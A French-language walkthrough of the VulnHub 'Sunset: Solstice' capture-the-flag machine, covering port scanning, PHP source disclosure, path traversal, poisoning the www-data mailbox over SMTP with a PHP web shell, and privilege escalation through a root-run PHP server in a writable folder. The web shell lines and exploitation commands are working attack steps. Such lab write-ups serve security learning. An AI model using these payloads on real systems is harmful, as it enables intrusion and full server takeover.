---
title: "Solution du CTF Sunset: Solstice VulnHub"
tags: [CTF, VulnHub]
---

[Sunset: Solstice](https://vulnhub.com/entry/sunset-solstice,499/) revient sur les classiques de l'exploitation web comme les premiers de la série *Sunset* alors que les épisodes *Dawn* résolus plus tôt se concentraient sur l'exploitation de binaires.

On voit que l'auteur n'aime pas trop installer des CMS, je n'ai encore croisé aucun *Wordpress* dans les CTFs de cette série XD

Pendant que *Nmap* tourne je regarde s'il y a quelque chose sur le port 80, ce qui est le cas :

```html
 <head>
Currently configuring the database, try later.
 <style type ="text/css" >
   .footer{ 
       position: fixed;     
       text-align: center;    
       bottom: 0px; 
       width: 100%;
   }  
</style>
</head>
<body>
    <div class="footer">Proudly powered by phpIPAM 1.4</div>
</body>
```

On a le nom d'une appli web et une version, mais une énumération ne retourne que ces dossiers :

```
403        9l       28w      279c http://192.168.56.163/backup/  
403        9l       28w      279c http://192.168.56.163/app/  
403        9l       28w      279c http://192.168.56.163/javascript/  
403        9l       28w      279c http://192.168.56.163/icons/  
403        9l       28w      279c http://192.168.56.163/server-status/
```

Tous retournent une erreur 403 et fouiller dans ces dossiers ne remonte rien du tout.

Pendant ce temps *Nmap* a remonté les résultats :

```
Nmap scan report for 192.168.56.163
Host is up (0.00017s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         pyftpdlib 1.5.6
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp    open  smtp        Exim smtpd 4.92
| smtp-vuln-cve2010-4344: 
|   Exim version: 4.92
|   Exim heap overflow vulnerability (CVE-2010-4344):
|     Exim (CVE-2010-4344): NOT VULNERABLE
|   Exim privileges escalation vulnerability (CVE-2010-4345):
|     Exim (CVE-2010-4345): NOT VULNERABLE
|_  To confirm and exploit the vulnerabilities, run with --script-args='smtp-vuln-cve2010-4344.exploit'
| vulners: 
|   cpe:/a:exim:exim:4.92: 
|       SMNTC-110023    10.0    https://vulners.com/symantec/SMNTC-110023
|       F89047E2-C89C-5590-9779-EAEEE60078B9    10.0    https://vulners.com/githubexploit/F89047E2-C89C-5590-9779-EAEEE60078B9  *EXPLOIT*
|       E1FEC345-BB7E-5FFE-AD78-64A1B9E93172    10.0    https://vulners.com/githubexploit/E1FEC345-BB7E-5FFE-AD78-64A1B9E93172  *EXPLOIT*
--- snip ---
80/tcp    open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       EDB-ID:51193    7.5     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
--- snip ---
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2121/tcp  open  ftp         pyftpdlib 1.5.6
3128/tcp  open  http-proxy  Squid http proxy 4.6
--- snip ---
8593/tcp  open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
54787/tcp open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
62524/tcp open  ftp         FreeFloat ftpd 1.00
| vulners: 
|   cpe:/a:freefloat:freefloat_ftp_server:1.00: 
|       EXPLOITPACK:3EBF0E55C674823927925D2FCF25522D    10.0    https://vulners.com/exploitpack/EXPLOITPACK:3EBF0E55C674823927925D2FCF25522D    *EXPLOIT*
|       EDB-ID:22351    10.0    https://vulners.com/exploitdb/EDB-ID:22351      *EXPLOIT*
|       CVE-2012-5106   10.0    https://vulners.com/cve/CVE-2012-5106
|       VERACODE:38999  0.0     https://vulners.com/veracode/VERACODE:38999
|_      VERACODE:38997  0.0     https://vulners.com/veracode/VERACODE:38997
| ftp-libopie: 
|   VULNERABLE:
|   OPIE off-by-one stack overflow
|     State: LIKELY VULNERABLE
|     IDs:  BID:40403  CVE:CVE-2010-1938
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       An off-by-one error in OPIE library 2.4.1-test1 and earlier, allows remote
|       attackers to cause a denial of service or possibly execute arbitrary code
|       via a long username.
|     Disclosure date: 2010-05-27
|     References:
|       http://security.freebsd.org/advisories/FreeBSD-SA-10:05.opie.asc
|       https://www.securityfocus.com/bid/40403
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1938
|_      http://site.pi3.com.pl/adv/libopie-adv.txt
```

## PHP exploitation 101

Comme ce CTF est certainement fait sur la même distribution que le CTF [Sunset: Dusk]({% link _posts/2023-04-04-Solution-du-CTF-Sunset-Dusk-de-VulnHub.md %}) du même auteur et avec la même version des outils, j'utilise la faille de source disclosure qui touche PHP CLI.

Jetons un œil au code servi sur le port 8593 :

```console
$ echo -e "GET /index.php HTTP/1.1\r\nHost: pd.research\r\n\r\nGET /xyz.xyz HTTP/1.1\r\n\r\n" | ncat 192.168.56.163 8593 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.163:8593.
HTTP/1.1 200 OK
Host: pd.research
Date: Sat, 08 Apr 2023 16:29:16 GMT
Connection: close
Content-Type: chemical/x-xyz
Content-Length: 499

<?php
session_start();
?>
<html>
    <head>
        <link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet"> 
        <link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
        <div class="menu">
            <a href="index.php">Main Page</a>
            <a href="index.php?book=list">Book List</a>
        </div>
<?php
        echo "We are still setting up the library! Try later on!";
        echo "<p>";
        include("/var/www/html/server/" . $_GET['book']);
        echo "</p>";
?>
    </body>
</html>
Ncat: 72 bytes sent, 644 bytes received in 0.20 seconds.
```

On a une faille d'inclusion PHP, on peut ainsi lire le fichier `/etc/passwd`. Je lance `ffuf` avec une wordlist de noms de fichiers pour voir ce qui traine sur le système :

```console
$ ffuf -u "http://192.168.56.163:8593/index.php?book=../../../../../../../FUZZ"  -w wordlists/files/logfiles.txt -fs 376

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.163:8593/index.php?book=../../../../../../../FUZZ
 :: Wordlist         : FUZZ: wordlists/files/logfiles.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 376
________________________________________________

/etc/group              [Status: 200, Size: 1280, Words: 45, Lines: 80]
/etc/hosts              [Status: 200, Size: 562, Words: 63, Lines: 20]
/etc/apache2/apache2.conf [Status: 200, Size: 7600, Words: 986, Lines: 240]
/etc/issue.net          [Status: 200, Size: 396, Words: 47, Lines: 14]
/etc/mysql/my.cnf       [Status: 200, Size: 1245, Words: 159, Lines: 36]
/etc/services           [Status: 200, Size: 19150, Words: 1142, Lines: 591]
/etc/motd               [Status: 200, Size: 662, Words: 80, Lines: 20]
/etc/crontab            [Status: 200, Size: 1418, Words: 225, Lines: 35]
/etc/issue              [Status: 200, Size: 403, Words: 49, Lines: 15]
/etc/os-release         [Status: 200, Size: 637, Words: 50, Lines: 22]
/etc/passwd             [Status: 200, Size: 2444, Words: 71, Lines: 49]
/etc/ssh/sshd_config    [Status: 200, Size: 3611, Words: 337, Lines: 134]
/proc/cmdline           [Status: 200, Size: 472, Words: 48, Lines: 14]
/proc/self/environ      [Status: 200, Size: 470, Words: 45, Lines: 13]
/proc/version           [Status: 200, Size: 512, Words: 58, Lines: 14]
/var/log/alternatives.log.1 [Status: 200, Size: 35120, Words: 2414, Lines: 164]
/var/log/apache2/access.log [Status: 200, Size: 229988257, Words: 23052722, Lines: 2094540]
/var/log/dpkg.log.1     [Status: 200, Size: 607126, Words: 45161, Lines: 9073]
/var/log/faillog        [Status: 200, Size: 32440, Words: 45, Lines: 13]
/var/log/fontconfig.log [Status: 200, Size: 2648, Words: 237, Lines: 46]
/var/log/lastlog        [Status: 200, Size: 292960, Words: 45, Lines: 13]
/var/log/wtmp           [Status: 200, Size: 80248, Words: 48, Lines: 27]
/var/mail/www-data      [Status: 200, Size: 5203, Words: 495, Lines: 121]
/var/run/utmp           [Status: 200, Size: 1528, Words: 45, Lines: 14]
/var/spool/mail/www-data [Status: 200, Size: 5203, Words: 495, Lines: 121]
/var/log/apache2/error.log [Status: 200, Size: 397733008, Words: 44081771, Lines: 1526480]
:: Progress: [275/275] :: Job [1/1] :: 1218 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

Je peux inclure `/var/spool/mail/www-data`, ça tombe bien, car un serveur SMTP est accessible. Je vais pouvoir envoyer un mail à `www-data` pour écrire dans ce fichier comme sur le CTF [Underdist #3]({% link _posts/2023-01-01-Solution-du-CTF-Underdist-3-de-VulnHub.md %}).

```console
$ ncat 192.168.56.163 25 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.163:25.
220 solstice ESMTP Exim 4.92 Sat, 08 Apr 2023 12:45:19 -0400
HELO solstice
250 solstice Hello solstice [192.168.56.1]
MAIL FROM: zozo@hacker.com
250 OK
RCPT TO: www-data
501 www-data: recipient address must contain a domain
RCPT TO: www-data@solstice
250 Accepted
DATA
354 Enter message, ending with "." on a line by itself
start<?php system($_GET["cmd"]); ?>end
.
250 OK id=1plBhP-0000b7-Og
QUIT
221 solstice closing connection
```

Avec cette exécution de commande, je fouille sur le système. Je découvre que l'un des ports est un honeypot :

```python
import socket

"""
while(true):

   def server():
       sx = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       sx.bind(("0.0.0.0", 62524))
       sx.listen(5)
       print("[*] Starting the server")
       cx,addr = sx.accept()
       print("[!] Connection received from %s" % str(addr))
       cx.send("220 FreeFloat Ftp Server (Version 1.00).\r\n")

    if (sx.close):
        server()
"""

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0", 62524))

s.listen(1)

while True:

  c, addr = s.accept()

  # Receive request
  data = c.recv(1024)
  if data != "something":
    c.sendall("220 FreeFloat Ftp Server (Version 1.00).\r\n")
    c.close()
  else:
    c.sendall("220 FreeFloat Ftp Server (Version 1.00).\r\n")
    c.close()
s.close()
```

Sous `/var/tmp/webserver_2/` je trouve le code servi sur le port 54787, mais l'appli web présente dans le sous dossier `project`, qui correspond normalement à [leefish/filethingie: PHP File Manager](https://github.com/leefish/filethingie), ne répond pas.

## Don't run that as root

En regardant les processus lancés par root c'est plus intéressant :

```
root       378  0.0  0.7 196744  7704 ?        S    09:23   0:00 /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
root       379  0.0  0.7  24304  7344 ?        S    09:23   0:00 /usr/bin/python -m pyftpdlib -p 21 -u 15090e62f66f41b547b75973f9d516af -P 15090e62f66f41b547b75973f9d516af -d /root/ftp/
```

On a donc un PHP CLI exécuté par root qui sert un dossier dans lequel on peut écrire :

```console
www-data@solstice:/var/tmp$ ls -al sv
total 12K
drwsrwxrwx 2 root root 4.0K Apr  8 12:56 .
drwxrwxrwt 9 root root 4.0K Apr  8 12:39 ..
-rwxrwxrwx 1 root root   36 Jun 19  2020 index.php
```

On s'y met sans plus attendre :

```console
www-data@solstice:/var/tmp$ echo '<?php system($_GET["cmd"]); ?>' > sv/shell.php
www-data@solstice:/var/tmp$ curl "http://127.0.0.1:57/shell.php?cmd=id"
uid=0(root) gid=0(root) groups=0(root)
www-data@solstice:/var/tmp$ curl "http://127.0.0.1:57/shell.php?cmd=ls+/root"
ftp
root.txt
www-data@solstice:/var/tmp$ curl "http://127.0.0.1:57/shell.php?cmd=cat+/root/root.txt"

No ascii art for you >:(

Thanks for playing! - Felipe Winsnes (@whitecr0wz)

f950998f0d484a2ef1ea83ed4f42bbca
```


